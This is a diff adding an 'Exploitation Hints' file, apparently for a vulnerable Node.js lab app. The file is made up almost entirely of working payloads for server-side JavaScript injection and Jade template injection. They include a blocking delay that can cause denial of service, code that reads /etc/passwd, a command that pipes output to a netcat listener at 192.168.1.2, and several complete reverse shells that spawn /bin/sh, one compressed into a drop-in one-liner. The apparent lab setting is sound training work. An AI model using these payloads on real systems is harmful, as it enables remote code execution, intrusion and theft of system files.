@@ -1,0 +1,68 @@
+Exploitation Hints
+
+
+SSJI
+
+1. A blocking nodejs delay can be achieved by using the following:
+    var start=new Date().getTime() ;while (new Date().getTime() < start + 5000);
+
+    BE CAUTIOUS!! Can cause Denial of Service as you are effectively blocking the process
+
+2. Files can be read with the following payload:
+
+      res.end(require('fs').readFileSync('/etc/passwd').toString())
+
+3. Command shell
+
+   Can verify using netcat (ensure IP and ports are correct):
+
+   $ nc -nlv 9999
+
+   root.process.mainModule.require('child_process').exec('id | nc 192.168.1.2 9999')
+
+      (function(){
+        var net = require("net"),
+            cp = require("child_process"),
+            sh = cp.spawn("/bin/sh", []);
+        var client = new net.Socket();
+        client.connect(9999, "192.168.1.2", function(){
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+        });
+        return /a/;
+      })();
+
+  Reverse shell from here: https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
+
+SSTI
+
+1. Verify vulnerable using something like the following:
+
+  = 7*7
+
+2. Reading /etc/passwd can be done this way:
+
+- var d = root.process.mainModule.require('fs').readFileSync('/etc/passwd').toString();
+div #{d}
+
+3. Reverse Shell
+
+For Jade, we need to define the function and then execute it server side:
+
+function a(){
+  var x = root.process.mainModule.require
+  var net = x("net"), cp = x("child_process"), sh = cp.spawn("/bin/sh", []);
+  var client = new net.Socket();
+  client.connect(9999, "192.168.1.2", function(){
+      client.pipe(sh.stdin);
+      sh.stdout.pipe(client);
+      sh.stderr.pipe(client);
+  });
+  return /a/;
+}
+
+drop in payload:
+
+- function a(){var x = root.process.mainModule.require;var net = x("net"), cp = x("child_process"), sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(9999, "192.168.1.2", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;}
+= a()
